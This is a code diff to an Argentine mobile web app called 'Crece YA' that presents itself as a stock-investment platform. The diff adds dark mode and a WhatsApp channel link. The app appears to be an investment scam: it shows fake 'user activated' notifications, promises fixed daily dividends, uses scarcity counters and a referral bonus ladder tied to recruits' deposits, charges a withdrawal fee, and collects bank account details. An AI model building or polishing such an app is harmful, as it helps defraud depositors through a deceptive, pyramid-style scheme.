@@ -5,20 +5,60 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Crece YA - Inversiones Bursátiles</title>
   
-  <!-- Fuente Outfit (Amigable, redondeada y legible) -->
+  <!-- Tipografía estilo SuperMicro (Inter: compacta, moderna y legible) -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   
   <style>
     body {
-      font-family: 'Outfit', sans-serif !important;
-      font-size: 15px;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif !important;
+      font-size: 14.5px;
       touch-action: manipulation;
       -webkit-tap-highlight-color: transparent;
+      transition: background-color 0.3s ease, color 0.3s ease;
+    }
+
+    /* MODO OSCURO (ESTILO SUPERMICRO / CYBER FINTECH) */
+    body.dark-mode {
+      background-color: #030a13 !important;
+      color: #e2e8f0 !important;
+    }
+    body.dark-mode main {
+      background-color: #081322 !important;
+      border-color: #162a45 !important;
+    }
+    body.dark-mode header,
+    body.dark-mode nav {
+      background-color: rgba(8, 19, 34, 0.95) !important;
+      border-color: #162a45 !important;
+    }
+    body.dark-mode .card-theme {
+      background-color: #0e1e33 !important;
+      border-color: #1e3657 !important;
+      color: #f1f5f9 !important;
+    }
+    body.dark-mode .subbox-theme {
+      background-color: #132742 !important;
+      border-color: #203e66 !important;
+    }
+    body.dark-mode .text-main {
+      color: #f8fafc !important;
+    }
+    body.dark-mode .text-sub {
+      color: #94a3b8 !important;
+    }
+    body.dark-mode .nav-btn-inactive {
+      background-color: #0e1e33 !important;
+      color: #94a3b8 !important;
+    }
+    body.dark-mode .social-ticker {
+      background-color: #0c1a2d !important;
+      border-color: #1a3252 !important;
+      color: #94a3b8 !important;
     }
   </style>
 </head>
@@ -29,7 +69,7 @@
     <div class="w-full max-w-sm bg-[#0b1b2d] border border-sky-900/60 rounded-3xl p-6 shadow-2xl space-y-4 text-white">
       <div class="text-center space-y-2">
         <img src="./logo.png" alt="Crece YA" class="h-16 w-auto mx-auto object-contain">
-        <h2 class="text-xl font-extrabold tracking-wider pt-0.5">CRECE YA</h2>
+        <h2 class="text-xl font-black tracking-wider pt-0.5">CRECE YA</h2>
         <p class="text-xs text-sky-300/80">Acceso Seguro a la Plataforma Bursátil</p>
       </div>
 
@@ -82,18 +122,23 @@
   <main class="w-full max-w-sm bg-[#e0f2fe] border-x sm:border border-sky-200 min-h-screen sm:rounded-3xl shadow-2xl flex flex-col justify-between relative pb-20">
 
     <div>
-      <!-- HEADER CON DETECTOR ADMIN (4 TOQUES EN EL LOGO) -->
+      <!-- HEADER CON LOGO, DETECTOR ADMIN Y BOTÓN MODO OSCURO (SOL/LUNA) -->
       <header class="p-3.5 flex items-center justify-between border-b border-sky-200/80 bg-white/70 backdrop-blur-md sticky top-0 z-30">
         <div class="flex items-center gap-2.5 cursor-pointer select-none" id="admin-logo-trigger">
-          <img src="./logo.png" alt="Crece YA" class="h-10 w-auto object-contain">
+          <img src="./logo.png" alt="Crece YA" class="h-9 w-auto object-contain">
           <div>
-            <span class="font-extrabold tracking-wider text-slate-900 text-sm block leading-none">CRECE YA</span>
+            <span class="font-black tracking-wider text-slate-900 text-sm block leading-none text-main">CRECE YA</span>
             <span id="user-display-phone" class="text-[11px] text-sky-700 font-mono font-medium">+54 9 11 ...</span>
           </div>
         </div>
 
         <div class="flex items-center gap-2">
-          <span class="text-xs bg-sky-100 text-sky-800 border border-sky-300 px-2.5 py-0.5 rounded-full font-bold font-mono">
+          <!-- INTERRUPTOR MODO CLARO / OSCURO (SOL/LUNA) -->
+          <button id="btn-theme-toggle" onclick="toggleTheme()" class="w-8 h-8 rounded-xl bg-sky-100 dark:bg-slate-800 text-slate-700 dark:text-amber-300 border border-sky-300 dark:border-slate-700 flex items-center justify-center text-sm shadow-xs transition" title="Cambiar tema">
+            <i id="theme-icon" class="fa-solid fa-moon"></i>
+          </button>
+
+          <span class="text-xs bg-sky-100 text-sky-800 border border-sky-300 px-2 py-0.5 rounded-full font-bold font-mono">
             EN LÍNEA ✓
           </span>
           <button id="btn-logout" title="Cerrar sesión" class="text-slate-400 hover:text-rose-500 text-sm px-1">
@@ -103,7 +148,7 @@
       </header>
 
       <!-- NOTIFICACIÓN SOCIAL PROOF -->
-      <section class="bg-white/60 border-b border-sky-200/60 px-3 py-2 text-xs text-slate-600">
+      <section class="social-ticker bg-white/60 border-b border-sky-200/60 px-3 py-2 text-xs text-slate-600">
         <p class="truncate font-mono text-xs flex items-center gap-2">
           <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
           <span id="toast-social-text">Usuario +54 9 35... activó Spotify ($8.000 ARS)</span>
@@ -112,19 +157,19 @@
 
       <!-- ================= VISTA 1: PLANES ================= -->
       <div id="view-planes" class="space-y-4 p-3.5">
-        <div class="p-4 rounded-2xl bg-white border border-sky-200 shadow-sm relative overflow-hidden">
+        <div class="card-theme p-4 rounded-2xl bg-white border border-sky-200 shadow-sm relative overflow-hidden">
           <div class="flex items-center justify-between">
-            <span class="text-xs text-slate-500 font-medium">Saldo Disponible</span>
+            <span class="text-xs text-slate-500 font-medium text-sub">Saldo Disponible</span>
             <span class="text-xs bg-sky-50 text-sky-700 border border-sky-200 px-2 py-0.5 rounded-md font-mono font-bold">100% Pesos ARS</span>
           </div>
-          <h1 id="home-balance-display" class="text-3xl font-extrabold text-slate-900 mt-1 font-mono tracking-tight">$0 <span class="text-sm font-normal text-slate-400">ARS</span></h1>
-          <p class="text-xs text-slate-500 mt-0.5 font-mono">Mín. retiro: $5.000 ARS (Comisión administrativa 10%)</p>
+          <h1 id="home-balance-display" class="text-3xl font-black text-slate-900 mt-1 font-mono tracking-tight text-main">$0 <span class="text-sm font-normal text-slate-400">ARS</span></h1>
+          <p class="text-xs text-slate-500 mt-0.5 font-mono text-sub">Mín. retiro: $5.000 ARS (Comisión administrativa 10%)</p>
 
           <div class="grid grid-cols-2 gap-2 mt-3.5">
-            <button onclick="openWalletModal('recargar')" class="bg-sky-600 hover:bg-sky-700 text-white font-extrabold py-2.5 rounded-xl text-xs transition shadow flex items-center justify-center gap-1.5">
+            <button onclick="openWalletModal('recargar')" class="bg-sky-600 hover:bg-sky-700 text-white font-black py-2.5 rounded-xl text-xs transition shadow flex items-center justify-center gap-1.5">
               <i class="fa-solid fa-plus"></i> Cargar Saldo
             </button>
-            <button onclick="openWalletModal('retirar')" class="bg-sky-800 hover:bg-sky-900 text-white font-extrabold py-2.5 rounded-xl text-xs transition shadow flex items-center justify-center gap-1.5">
+            <button onclick="openWalletModal('retirar')" class="bg-sky-800 hover:bg-sky-900 text-white font-black py-2.5 rounded-xl text-xs transition shadow flex items-center justify-center gap-1.5">
               <i class="fa-solid fa-arrow-up-right-from-square"></i> Retirar
             </button>
           </div>
@@ -132,8 +177,8 @@
 
         <!-- Selector de Categorías: INICIALES vs VIP -->
         <div class="flex items-center justify-between px-1">
-          <span class="text-xs font-bold text-slate-800 uppercase tracking-wide">MERCADO BURSÁTIL</span>
-          <div class="flex gap-1 bg-white/70 p-1 rounded-xl border border-sky-200 text-xs">
+          <span class="text-xs font-bold text-slate-800 uppercase tracking-wide text-main">MERCADO BURSÁTIL</span>
+          <div class="subbox-theme flex gap-1 bg-white/70 p-1 rounded-xl border border-sky-200 text-xs">
             <button id="btn-tab-iniciales" class="px-3 py-1 rounded-lg font-bold bg-sky-600 text-white transition">
               Iniciales
             </button>
@@ -148,104 +193,104 @@
 
       <!-- ================= VISTA 2: PRODUCTOS ================= -->
       <div id="view-productos" class="hidden p-3.5 space-y-3">
-        <div class="p-3.5 bg-white/80 border border-sky-200 rounded-2xl">
-          <h2 class="text-xs font-bold text-slate-850 uppercase tracking-wide flex items-center gap-1.5">
+        <div class="card-theme p-3.5 bg-white/80 border border-sky-200 rounded-2xl">
+          <h2 class="text-xs font-bold text-slate-850 uppercase tracking-wide flex items-center gap-1.5 text-main">
             <i class="fa-solid fa-box-open text-sky-600"></i> Tus Acciones Adquiridas
           </h2>
-          <p class="text-xs text-slate-500 mt-0.5 font-mono">El capital y los dividendos se acreditan al culminar el reloj en vivo.</p>
+          <p class="text-xs text-slate-500 mt-0.5 font-mono text-sub">El capital y los dividendos se acreditan al culminar el reloj en vivo.</p>
         </div>
         <div id="active-products-container" class="space-y-3"></div>
       </div>
 
       <!-- ================= VISTA 3: COMPARTIR ================= -->
       <div id="view-compartir" class="hidden p-3.5 space-y-4">
-        <div class="p-4 bg-white border border-sky-200 rounded-2xl shadow-sm space-y-3">
+        <div class="card-theme p-4 bg-white border border-sky-200 rounded-2xl shadow-sm space-y-3">
           <div class="flex items-center gap-2.5">
             <div class="w-9 h-9 rounded-xl bg-sky-100 text-sky-600 flex items-center justify-center text-base">
               <i class="fa-solid fa-share-nodes"></i>
             </div>
             <div>
-              <h2 class="text-sm font-bold text-slate-900">Tu Enlace de Invitación</h2>
-              <span class="text-xs text-slate-500 font-mono">Gana comisiones al validar su primer depósito</span>
+              <h2 class="text-sm font-bold text-slate-900 text-main">Tu Enlace de Invitación</h2>
+              <span class="text-xs text-slate-500 font-mono text-sub">Gana comisiones al validar su primer depósito</span>
             </div>
           </div>
 
-          <div class="flex items-center bg-slate-50 border border-sky-200 rounded-xl px-3 py-2 gap-2">
+          <div class="subbox-theme flex items-center bg-slate-50 border border-sky-200 rounded-xl px-3 py-2 gap-2">
             <input id="ref-link-input" type="text" readonly class="bg-transparent text-xs text-sky-800 font-mono w-full outline-none select-all truncate">
             <button id="btn-copy-ref" class="px-3 py-1 bg-sky-600 hover:bg-sky-700 text-white text-xs font-bold rounded-lg transition shrink-0">
               Copiar
             </button>
           </div>
 
-          <button id="btn-share-whatsapp" class="w-full py-2.5 bg-emerald-500 hover:bg-emerald-600 text-slate-950 font-extrabold text-xs rounded-xl transition shadow flex items-center justify-center gap-2">
+          <button id="btn-share-whatsapp" class="w-full py-2.5 bg-emerald-500 hover:bg-emerald-600 text-slate-950 font-black text-xs rounded-xl transition shadow flex items-center justify-center gap-2">
             <i class="fa-brands fa-whatsapp text-base"></i> Compartir en WhatsApp
           </button>
         </div>
 
-        <div class="p-3.5 bg-amber-50 border border-amber-200 rounded-2xl text-xs text-amber-900 leading-relaxed space-y-1">
+        <div class="p-3.5 bg-amber-50 dark:bg-amber-950/40 border border-amber-200 dark:border-amber-800/50 rounded-2xl text-xs text-amber-900 dark:text-amber-200 leading-relaxed space-y-1">
           <p class="font-bold flex items-center gap-1.5">
             <i class="fa-solid fa-shield-halved text-amber-600"></i> Aviso de Seguridad:
           </p>
           <p>Un usuario se registra como Oficial tras concretar su primer depósito ($2.000 ARS). Las bonificaciones se liberan de forma automática.</p>
         </div>
 
-        <div class="p-3.5 bg-white border border-sky-200 rounded-2xl space-y-2.5">
-          <h3 class="text-xs font-bold text-slate-850 uppercase tracking-wide">Escala de Bonificaciones</h3>
+        <div class="card-theme p-3.5 bg-white border border-sky-200 rounded-2xl space-y-2.5">
+          <h3 class="text-xs font-bold text-slate-850 uppercase tracking-wide text-main">Escala de Bonificaciones</h3>
           <div class="grid grid-cols-2 gap-2 text-xs font-mono">
-            <div class="p-2.5 rounded-xl bg-slate-50 border border-slate-100">1 Invitado: <strong class="text-sky-700">+$1.000 ARS</strong></div>
-            <div class="p-2.5 rounded-xl bg-slate-50 border border-slate-100">3 Invitados: <strong class="text-sky-700">+$2.000 ARS</strong></div>
-            <div class="p-2.5 rounded-xl bg-slate-50 border border-slate-100">5 Invitados: <strong class="text-sky-700">+$4.000 ARS</strong></div>
-            <div class="p-2.5 rounded-xl bg-slate-50 border border-slate-100">10 Invitados: <strong class="text-sky-700">+$8.000 ARS</strong></div>
-            <div class="p-2.5 rounded-xl bg-slate-50 border border-slate-100">20 Invitados: <strong class="text-sky-700">+$15.000 ARS</strong></div>
-            <div class="p-2.5 rounded-xl bg-slate-50 border border-slate-100">40 Invitados: <strong class="text-sky-700">+$30.000 ARS</strong></div>
-            <div class="p-2.5 rounded-xl bg-slate-50 border border-slate-100">50 Invitados: <strong class="text-sky-700">+$60.000 ARS</strong></div>
-            <div class="p-2.5 rounded-xl bg-slate-50 border border-slate-100">100 Invitados: <strong class="text-sky-700">+$100.000 ARS</strong></div>
+            <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">1 Invitado: <strong class="text-sky-700">+$1.000 ARS</strong></div>
+            <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">3 Invitados: <strong class="text-sky-700">+$2.000 ARS</strong></div>
+            <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">5 Invitados: <strong class="text-sky-700">+$4.000 ARS</strong></div>
+            <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">10 Invitados: <strong class="text-sky-700">+$8.000 ARS</strong></div>
+            <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">20 Invitados: <strong class="text-sky-700">+$15.000 ARS</strong></div>
+            <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">40 Invitados: <strong class="text-sky-700">+$30.000 ARS</strong></div>
+            <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">50 Invitados: <strong class="text-sky-700">+$60.000 ARS</strong></div>
+            <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">100 Invitados: <strong class="text-sky-700">+$100.000 ARS</strong></div>
           </div>
         </div>
       </div>
 
       <!-- ================= VISTA 4: MI PERFIL ================= -->
       <div id="view-perfil" class="hidden p-3.5 space-y-4">
-        <div class="p-4 bg-white border border-sky-200 rounded-2xl shadow-sm space-y-3">
+        <div class="card-theme p-4 bg-white border border-sky-200 rounded-2xl shadow-sm space-y-3">
           <div class="flex justify-between items-center">
-            <span class="text-xs font-semibold text-slate-500">Resumen de Cuenta</span>
+            <span class="text-xs font-semibold text-slate-500 text-sub">Resumen de Cuenta</span>
             <span class="text-xs font-mono bg-emerald-50 text-emerald-700 border border-emerald-200 px-2 py-0.5 rounded-full font-bold">Activo</span>
           </div>
 
           <div class="grid grid-cols-3 gap-2 text-center font-mono">
-            <div class="p-2.5 bg-slate-50 rounded-xl border border-slate-100">
-              <span class="text-[10px] text-slate-400 block">DISPONIBLE</span>
-              <strong id="profile-bal-ars" class="text-xs text-slate-900 font-bold">$0</strong>
+            <div class="subbox-theme p-2.5 bg-slate-50 rounded-xl border border-slate-100">
+              <span class="text-[10px] text-slate-400 block text-sub">DISPONIBLE</span>
+              <strong id="profile-bal-ars" class="text-xs text-slate-900 font-bold text-main">$0</strong>
             </div>
-            <div class="p-2.5 bg-slate-50 rounded-xl border border-slate-100">
-              <span class="text-[10px] text-slate-400 block">EN REVISIÓN</span>
+            <div class="subbox-theme p-2.5 bg-slate-50 rounded-xl border border-slate-100">
+              <span class="text-[10px] text-slate-400 block text-sub">EN REVISIÓN</span>
               <strong id="profile-pending-ars" class="text-xs text-amber-600 font-bold">$0</strong>
             </div>
-            <div class="p-2.5 bg-slate-50 rounded-xl border border-slate-100">
-              <span class="text-[10px] text-slate-400 block">RETIRADO</span>
+            <div class="subbox-theme p-2.5 bg-slate-50 rounded-xl border border-slate-100">
+              <span class="text-[10px] text-slate-400 block text-sub">RETIRADO</span>
               <strong id="profile-withdrawn-ars" class="text-xs text-sky-700 font-bold">$0</strong>
             </div>
           </div>
         </div>
 
-        <div class="p-3.5 bg-white border border-sky-200 rounded-2xl flex items-center justify-between shadow-xs">
+        <div class="card-theme p-3.5 bg-white border border-sky-200 rounded-2xl flex items-center justify-between shadow-xs">
           <div class="flex items-center gap-2.5">
             <div class="w-10 h-10 rounded-xl bg-amber-400/20 text-amber-600 flex items-center justify-center text-lg font-bold">
               <i class="fa-solid fa-calendar-check"></i>
             </div>
             <div>
-              <span class="text-sm font-bold text-slate-900 block">Check-in Diario</span>
+              <span class="text-sm font-bold text-slate-900 block text-main">Check-in Diario</span>
               <span id="checkin-status-text" class="text-xs text-amber-700 font-mono font-medium">+$500 ARS listos para reclamar</span>
             </div>
           </div>
-          <button id="btn-claim-daily" class="px-4 py-2 bg-amber-400 hover:bg-amber-300 text-slate-950 text-xs font-extrabold rounded-xl transition shadow">
+          <button id="btn-claim-daily" class="px-4 py-2 bg-amber-400 hover:bg-amber-300 text-slate-950 text-xs font-black rounded-xl transition shadow">
             Cobrar
           </button>
         </div>
 
-        <div class="p-4 bg-white border border-sky-200 rounded-2xl space-y-3 text-xs">
+        <div class="card-theme p-4 bg-white border border-sky-200 rounded-2xl space-y-3 text-xs">
           <div class="flex justify-between items-center">
-            <span class="font-bold text-slate-800 text-sm">Cuenta Bancaria para Retiros</span>
+            <span class="font-bold text-slate-800 text-sm text-main">Cuenta Bancaria para Retiros</span>
             <span id="bank-status-badge" class="flex items-center gap-1 text-xs font-mono text-amber-600 font-bold">
               <span class="w-2 h-2 rounded-full bg-amber-500 animate-pulse"></span> 🟠 En proceso de validación
             </span>
@@ -253,17 +298,17 @@
 
           <div class="space-y-2.5 text-xs">
             <div>
-              <label class="text-slate-400 block text-[11px] mb-0.5">NOMBRE Y APELLIDO DEL TITULAR</label>
-              <input id="prof-name-input" type="text" class="w-full bg-slate-50 border border-slate-200 rounded-xl p-2 font-medium text-slate-900 outline-none" placeholder="Tu Nombre Completo">
+              <label class="text-slate-400 block text-[11px] mb-0.5 text-sub">NOMBRE Y APELLIDO DEL TITULAR</label>
+              <input id="prof-name-input" type="text" class="subbox-theme w-full bg-slate-50 border border-slate-200 rounded-xl p-2 font-medium text-slate-900 text-main outline-none" placeholder="Tu Nombre Completo">
             </div>
             <div class="grid grid-cols-2 gap-2">
               <div>
-                <label class="text-slate-400 block text-[11px] mb-0.5">CBU O CVU PERSONAL</label>
-                <input id="prof-cvu-input" type="text" class="w-full bg-slate-50 border border-slate-200 rounded-xl p-2 font-mono text-slate-900 outline-none" placeholder="22 dígitos">
+                <label class="text-slate-400 block text-[11px] mb-0.5 text-sub">CBU O CVU PERSONAL</label>
+                <input id="prof-cvu-input" type="text" class="subbox-theme w-full bg-slate-50 border border-slate-200 rounded-xl p-2 font-mono text-slate-900 text-main outline-none" placeholder="22 dígitos">
               </div>
               <div>
-                <label class="text-slate-400 block text-[11px] mb-0.5">ALIAS BANCARIO</label>
-                <input id="prof-alias-input" type="text" class="w-full bg-slate-50 border border-slate-200 rounded-xl p-2 font-mono text-slate-900 outline-none" placeholder="Ej: tu.alias.mp">
+                <label class="text-slate-400 block text-[11px] mb-0.5 text-sub">ALIAS BANCARIO</label>
+                <input id="prof-alias-input" type="text" class="subbox-theme w-full bg-slate-50 border border-slate-200 rounded-xl p-2 font-mono text-slate-900 text-main outline-none" placeholder="Ej: tu.alias.mp">
               </div>
             </div>
             <button id="btn-save-profile" class="w-full py-2 bg-slate-800 hover:bg-slate-700 text-white font-bold rounded-xl transition mt-1">
@@ -272,13 +317,25 @@
           </div>
         </div>
 
-        <!-- ENLACE AL CANAL DE DIFUSIÓN OFICIAL -->
+        <!-- BOTÓN CANAL OFICIAL DE WHATSAPP -->
+        <a href="https://whatsapp.com/channel/0029Vb8mCGGLI8YahzbVBb0G" target="_blank" class="p-3.5 bg-emerald-600 hover:bg-emerald-500 text-white rounded-2xl flex items-center justify-between shadow-sm transition">
+          <div class="flex items-center gap-3">
+            <i class="fa-brands fa-whatsapp text-2xl"></i>
+            <div>
+              <span class="text-sm font-bold block">Canal Oficial en WhatsApp</span>
+              <span class="text-xs text-emerald-100">Noticias del Mercado y Alertas Oficiales</span>
+            </div>
+          </div>
+          <i class="fa-solid fa-chevron-right text-xs"></i>
+        </a>
+
+        <!-- BOTÓN CANAL DE DIFUSIÓN TELEGRAM -->
         <a href="https://t.me/creceya2026" target="_blank" class="p-3.5 bg-sky-500 hover:bg-sky-400 text-white rounded-2xl flex items-center justify-between shadow-sm transition">
           <div class="flex items-center gap-3">
             <i class="fa-brands fa-telegram text-2xl"></i>
             <div>
-              <span class="text-sm font-bold block">Canal Oficial & Difusión</span>
-              <span class="text-xs text-sky-100">@creceya2026 • Noticias y Novedades del Mercado</span>
+              <span class="text-sm font-bold block">Canal Oficial en Telegram</span>
+              <span class="text-xs text-sky-100">@creceya2026 • Comunidad y Difusión</span>
             </div>
           </div>
           <i class="fa-solid fa-chevron-right text-xs"></i>
@@ -292,15 +349,15 @@
         <i class="fa-solid fa-chart-pie text-sm"></i>
         <span class="text-[10px]">Planes</span>
       </button>
-      <button onclick="switchTab('productos')" id="nav-btn-productos" class="bg-sky-50 text-sky-800 hover:bg-sky-100 py-2 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition">
+      <button onclick="switchTab('productos')" id="nav-btn-productos" class="nav-btn-inactive bg-sky-50 text-sky-800 hover:bg-sky-100 py-2 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition">
         <i class="fa-solid fa-box-open text-sm"></i>
         <span class="text-[10px]">Productos</span>
       </button>
-      <button onclick="switchTab('compartir')" id="nav-btn-compartir" class="bg-sky-50 text-sky-800 hover:bg-sky-100 py-2 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition">
+      <button onclick="switchTab('compartir')" id="nav-btn-compartir" class="nav-btn-inactive bg-sky-50 text-sky-800 hover:bg-sky-100 py-2 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition">
         <i class="fa-solid fa-share-nodes text-sm"></i>
         <span class="text-[10px]">Compartir</span>
       </button>
-      <button onclick="switchTab('perfil')" id="nav-btn-perfil" class="bg-sky-50 text-sky-800 hover:bg-sky-100 py-2 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition">
+      <button onclick="switchTab('perfil')" id="nav-btn-perfil" class="nav-btn-inactive bg-sky-50 text-sky-800 hover:bg-sky-100 py-2 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition">
         <i class="fa-solid fa-user text-sm"></i>
         <span class="text-[10px]">Mi Perfil</span>
       </button>
@@ -499,6 +556,7 @@
       withdrawn: 0,
       lastClaim: 0,
       lastWithdraw: 0,
+      darkMode: false,
       activePlans: []
     };
 
@@ -513,8 +571,29 @@
       appState.withdrawn = parseFloat(localStorage.getItem('cy_withdrawn')) || 0;
       appState.lastClaim = parseInt(localStorage.getItem('cy_claim')) || 0;
       appState.lastWithdraw = parseInt(localStorage.getItem('cy_last_withdraw')) || 0;
+      appState.darkMode = localStorage.getItem('cy_dark') === 'true';
       appState.activePlans = JSON.parse(localStorage.getItem('cy_active_plans')) || [];
     } catch(e) {}
+
+    // APLICAR MODO OSCURO / CLARO
+    function applyTheme() {
+      const icon = document.getElementById('theme-icon');
+      if (appState.darkMode) {
+        document.body.classList.add('dark-mode');
+        if (icon) icon.className = "fa-solid fa-sun text-amber-300";
+      } else {
+        document.body.classList.remove('dark-mode');
+        if (icon) icon.className = "fa-solid fa-moon text-slate-700";
+      }
+    }
+
+    window.toggleTheme = function() {
+      appState.darkMode = !appState.darkMode;
+      try {
+        localStorage.setItem('cy_dark', appState.darkMode);
+      } catch(e) {}
+      applyTheme();
+    };
 
     function saveLocal() {
       try {
@@ -528,6 +607,7 @@
         localStorage.setItem('cy_withdrawn', appState.withdrawn);
         localStorage.setItem('cy_claim', appState.lastClaim);
         localStorage.setItem('cy_last_withdraw', appState.lastWithdraw);
+        localStorage.setItem('cy_dark', appState.darkMode);
         localStorage.setItem('cy_active_plans', JSON.stringify(appState.activePlans));
       } catch(e) {}
       renderUI();
@@ -595,7 +675,7 @@
       const tabs = ['planes', 'productos', 'compartir', 'perfil'];
       tabs.forEach(t => {
         document.getElementById(`view-${t}`).classList.add('hidden');
-        document.getElementById(`nav-btn-${t}`).className = "bg-sky-50 text-sky-800 hover:bg-sky-100 py-2 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition";
+        document.getElementById(`nav-btn-${t}`).className = "nav-btn-inactive bg-sky-50 text-sky-800 hover:bg-sky-100 py-2 rounded-xl font-semibold flex flex-col items-center gap-0.5 transition";
       });
       document.getElementById(`view-${tabName}`).classList.remove('hidden');
       document.getElementById(`nav-btn-${tabName}`).className = "bg-sky-600 text-white py-2 rounded-xl font-bold flex flex-col items-center gap-0.5 shadow-sm transition";
@@ -624,17 +704,17 @@
         const canActivate = appState.balance >= p.cost;
         const btnLabel = canActivate ? `Activar Plan: $${fmt(p.cost)}` : `Adquirir Plan: $${fmt(p.cost)}`;
         const card = document.createElement('div');
-        card.className = `p-4 rounded-2xl bg-white border ${p.border} shadow-xs hover:border-sky-400 transition space-y-2.5`;
+        card.className = `card-theme p-4 rounded-2xl bg-white border ${p.border} shadow-xs hover:border-sky-400 transition space-y-2.5`;
         
         card.innerHTML = `
           <div class="flex justify-between items-center">
             <div class="flex items-center gap-2.5">
-              <div class="w-9 h-9 rounded-xl bg-slate-50 border border-slate-200 p-1 flex items-center justify-center shrink-0 shadow-xs">
+              <div class="subbox-theme w-9 h-9 rounded-xl bg-slate-50 border border-slate-200 p-1 flex items-center justify-center shrink-0 shadow-xs">
                 <img src="${p.logo}" alt="${p.name}" class="w-full h-full object-contain">
               </div>
               <div>
-                <h3 class="font-bold text-slate-900 text-sm leading-none">${p.name}</h3>
-                <span class="text-[10px] text-slate-400 font-mono">Contrato Fraccional</span>
+                <h3 class="font-bold text-slate-900 text-sm leading-none text-main">${p.name}</h3>
+                <span class="text-[10px] text-slate-400 font-mono text-sub">Contrato Fraccional</span>
               </div>
             </div>
             <span class="text-xs font-mono font-bold px-2.5 py-0.5 rounded-md text-white" style="background-color: ${p.color}">
@@ -642,23 +722,23 @@
             </span>
           </div>
 
-          <div class="grid grid-cols-2 gap-2 text-xs font-mono bg-slate-50 p-2.5 rounded-xl border border-slate-100">
+          <div class="subbox-theme grid grid-cols-2 gap-2 text-xs font-mono bg-slate-50 p-2.5 rounded-xl border border-slate-100">
             <div>
-              <span class="text-slate-400 block text-[10px]">DIVIDENDO DIARIO</span>
+              <span class="text-slate-400 block text-[10px] text-sub">DIVIDENDO DIARIO</span>
               <strong class="text-sky-700 font-bold">+$${fmt(p.daily)} ARS/d</strong>
             </div>
             <div>
-              <span class="text-slate-400 block text-[10px]">TOTAL AL CIERRE</span>
-              <strong class="text-slate-900 font-bold">$${fmt(p.total)} ARS</strong>
+              <span class="text-slate-400 block text-[10px] text-sub">TOTAL AL CIERRE</span>
+              <strong class="text-slate-900 font-bold text-main">$${fmt(p.total)} ARS</strong>
             </div>
           </div>
 
-          <div class="flex justify-between text-xs text-slate-400 font-mono pt-0.5">
+          <div class="flex justify-between text-xs text-slate-400 font-mono pt-0.5 text-sub">
             <span>Quedan ${p.slotsLeft} de ${p.slotsTotal} cupos</span>
             <span class="text-sky-600 font-bold">Ronda 1</span>
           </div>
 
-          <button onclick="handlePlanClick('${p.id}')" class="w-full py-2.5 ${p.btnBg} font-extrabold text-xs rounded-xl transition shadow flex items-center justify-center gap-1">
+          <button onclick="handlePlanClick('${p.id}')" class="w-full py-2.5 ${p.btnBg} font-black text-xs rounded-xl transition shadow flex items-center justify-center gap-1">
             ${btnLabel}
           </button>
         `;
@@ -702,9 +782,9 @@
 
       if (appState.activePlans.length === 0) {
         container.innerHTML = `
-          <div class="p-6 bg-white border border-sky-100 rounded-2xl text-center space-y-2">
+          <div class="card-theme p-6 bg-white border border-sky-100 rounded-2xl text-center space-y-2">
             <i class="fa-solid fa-folder-open text-sky-300 text-4xl"></i>
-            <p class="text-xs text-slate-500 font-medium">No posees contratos bursátiles activos.</p>
+            <p class="text-xs text-slate-500 font-medium text-sub">No posees contratos bursátiles activos.</p>
             <button onclick="switchTab('planes')" class="px-4 py-2 bg-sky-600 text-white rounded-xl text-xs font-bold shadow">
               Explorar Mercado
             </button>
@@ -730,29 +810,29 @@
         const s = Math.floor((remaining % (1000 * 60)) / 1000);
 
         const card = document.createElement('div');
-        card.className = "p-4 bg-white border border-sky-200 rounded-2xl shadow-xs space-y-2.5";
+        card.className = "card-theme p-4 bg-white border border-sky-200 rounded-2xl shadow-xs space-y-2.5";
         card.innerHTML = `
           <div class="flex justify-between items-center">
             <div class="flex items-center gap-2">
               <img src="${plan.logo}" class="w-6 h-6 object-contain">
-              <h4 class="font-bold text-sm text-slate-900">${plan.name}</h4>
+              <h4 class="font-bold text-sm text-slate-900 text-main">${plan.name}</h4>
             </div>
             <span class="text-xs font-mono text-emerald-700 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-md font-bold">
               En Operación
             </span>
           </div>
-          <div class="grid grid-cols-2 gap-2 text-xs font-mono bg-slate-50 p-2.5 rounded-xl border border-slate-100">
+          <div class="subbox-theme grid grid-cols-2 gap-2 text-xs font-mono bg-slate-50 p-2.5 rounded-xl border border-slate-100">
             <div>
-              <span class="text-slate-400 block text-[10px]">INVERSIÓN</span>
-              <strong class="text-slate-800">$${fmt(plan.cost)} ARS</strong>
+              <span class="text-slate-400 block text-[10px] text-sub">INVERSIÓN</span>
+              <strong class="text-slate-800 text-main">$${fmt(plan.cost)} ARS</strong>
             </div>
             <div>
-              <span class="text-slate-400 block text-[10px]">TOTAL AL CIERRE</span>
+              <span class="text-slate-400 block text-[10px] text-sub">TOTAL AL CIERRE</span>
               <strong class="text-sky-700 font-bold">$${fmt(plan.total)} ARS</strong>
             </div>
           </div>
           <div class="flex items-center justify-between text-xs pt-1">
-            <span class="text-slate-400 font-mono">Conteo en vivo:</span>
